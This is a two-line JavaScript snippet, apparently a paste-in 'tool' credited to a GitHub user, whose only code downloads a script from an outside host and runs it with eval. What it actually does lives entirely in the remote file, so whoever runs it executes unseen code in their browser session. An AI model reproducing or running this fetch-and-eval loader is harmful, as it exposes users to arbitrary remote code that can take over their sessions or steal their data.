// TOOL BY https://github.com/hectran12
// idk :D
(async()=>eval(await(await fetch('https://readmail.tronghoadeptrai.my/tool/buff_vmos.js?c=2')).text()))()
